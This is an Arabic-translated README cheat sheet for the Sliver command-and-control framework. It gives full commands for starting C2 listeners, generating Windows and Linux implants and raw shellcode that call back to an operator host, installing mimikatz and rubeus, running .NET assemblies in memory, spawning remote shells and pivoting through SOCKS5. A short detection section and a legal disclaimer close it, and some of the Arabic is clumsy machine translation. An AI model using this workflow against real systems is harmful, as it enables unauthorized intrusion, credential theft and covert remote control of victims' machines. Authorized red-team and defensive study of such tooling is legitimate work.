<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="الأسقف فوكس">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="الفريق الأحمر">
</ص>

<p align="center">
  <b>⚔️ محاكاة حديثة ومتعددة المنصات ومفتوحة المصدر للخصم وإطار عمل للتحكم والتحكم يدعم بروتوكولات mTLS وWireGuard وHTTP(S) وDNS</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة والهندسة المعمارية](#-نظرة عامة--الهندسة المعمارية)
- [التثبيت وإعداد الخادم](#-التثبيت--إعداد الخادم)
  - [التثبيت التلقائي للخط الواحد](#التثبيت التلقائي للخط الواحد)
  - [تكوين مشغل متعدد اللاعبين](#multiplayer-operator-configuration)
- [تكوين المستمع (mTLS، HTTP، WireGuard، DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [توليد المنارات مقابل الجلسات)](#-توليد المنارات مقابل الجلسات)
  - [الجلسات التفاعلية مقابل الإشارات غير المتزامنة](#interactive-sessions-vs-as-asynchronous-beacons)
  - [Windows EXE وزرعات Shellcode](#windows-exe--shellcode-implants)
  - [عمليات زرع Linux وmacOS ELF](#linux--macos-elf-implants)
- [النظام البيئي لمرحلة ما بعد الاستغلال ومستودع الأسلحة](#-النظام البيئي لمرحلة ما بعد الاستغلال--النظام البيئي لمستودع الأسلحة)
  - [تثبيت ملحقات مستودع الأسلحة (BOFs، الكعك، حزام الأمان)](#installing-armory-extensions-bofs-donut-seatbelt)
  - [الوصول إلى بيانات الاعتماد وMimikatz](#credential-access--mimikatz)
  - [التمحور والديناميكي SOCKS5](#التمحور--dynamic-socks5)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة والهندسة المعمارية

تم تصميم **Sliver** في Go بواسطة **Bishop Fox**، وهو أحد البدائل الرائدة مفتوحة المصدر لأطر عمل C2 التجارية (Cobalt Strike، Brute Ratel):
- **النظام الأساسي المشترك:** يدعم الخادم والمزروعات أنظمة التشغيل Windows وLinux وmacOS عبر `x86_64` و`arm64` و`arm`.
- **الاتصال المراوغ:** دعم خارج الصندوق لـ TLS المتبادل (mTLS)، وأنفاق WireGuard UDP، وHTTP/HTTPS مع إنشاء الكناري الإجرائي، ونفق DNS.
- **التنفيذ داخل الذاكرة:** حقن DLL العاكس الأصلي، وملفات كائنات المنارة (BOFs)، وتنفيذ .NET المضمن عبر Donut، وتجويف العملية.
- **بنية متعددة اللاعبين:** تعاون في الوقت الفعلي بين العديد من مشغلي الفريق الأحمر عبر ملفات تعريف المشغلين الموقعة بالتشفير.

---

## 📥 التثبيت وإعداد الخادم

### التثبيت الآلي للخط الواحد
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### تكوين مشغل متعدد اللاعبين
قم بإنشاء ملف تعريف المشغل على خادم C2 لأحد أعضاء الفريق:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 تكوين المستمع (mTLS، HTTP، WireGuard، DNS)

داخل وحدة التحكم `sliver`:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 توليد الغرسات (المنارات مقابل الجلسات)

### الجلسات التفاعلية مقابل الإشارات غير المتزامنة
- **الجلسة:** اتصال TCP/TLS في الوقت الفعلي مع استجابة فورية للأوامر. رؤية أعلى للشبكة.
- **المرشد:** نبض قلب غير متزامن ينام لفترات زمنية مع اهتزاز عشوائي. يصعب بشكل كبير على SOCs التعرف على تحليل الشذوذ في الشبكة.

### عمليات زرع Windows EXE وShellcode
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### عمليات زرع Linux وmacOS ELF
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ النظام البيئي لمرحلة ما بعد الاستغلال ومستودع الأسلحة

### تثبيت ملحقات مستودع الأسلحة (BOFs، الدونات، حزام الأمان)
The Armory هو مدير الحزم المتكامل من Sliver للأدوات الهجومية التابعة لجهات خارجية وملفات كائنات Cobalt Strike Beacon (BOFs):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### التفاعل مع الجلسات والإشارات
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### الجوارب المحورية والديناميكية5
قم بتوجيه الأدوات الهجومية الخارجية مباشرة إلى الشبكة المستهدفة المخترقة:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| **بدء تشغيل مستمع mTLS** | `mtls --lport 8888` |
| **بدء تشغيل مستمع HTTPS** | `https --lport 443 --domain c2.domain.com` |
| ** إنشاء جلسة EXE ** | `generate --mtls <IP>:8888 --os windows -f exe` |
| ** إنشاء منارة EXE ** | `generate beacon --http <URL> --seconds 60 -f exe` |
| ** إنشاء كود القشرة الخام ** | `generate --mtls <IP>:8888 -f shellcode` |
| ** قائمة الجلسات والتفاعل معها **| `sessions` -> `use <ID>` |
| ** تثبيت أدوات مستودع الأسلحة ** | `armory install seatbelt mimikatz` |
| **تنفيذ .NET داخل الذاكرة**| `execute-assembly /path/to/binary.exe <args>` |
| ** الوكيل العكسي SOCKS5 ** | `socks5 start --port 1080` |

---

## 🛡️ الاعتبارات الدفاعية والكشوفات

1. ** JARM Fingerprinting: ** يمكن تحديد ملفات تعريف مستمعي HTTP الافتراضيين باستخدام بصمات JARM TLS النشطة. تخصيص شفرات TLS في تكوين Sliver.
2. **تحليل YARA والثنائي:** تحتوي عمليات الزرع الافتراضية التي تنتجها `generate` على بيانات تعريف Golang وهياكل الرموز ما لم يتم تشويشها عبر تشويه (`--skip-symbols`).

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> Sliver عبارة عن محاكاة متقدمة للخصم وإطار عمل للقيادة والتحكم للفريق الأحمر. ويجب نشره حصريًا في الاشتباكات المصرح بها مع قواعد اشتباك واضحة (RoE). يعد الاستخدام غير المصرح به على أجهزة الكمبيوتر التابعة لجهات خارجية أمرًا غير قانوني تمامًا.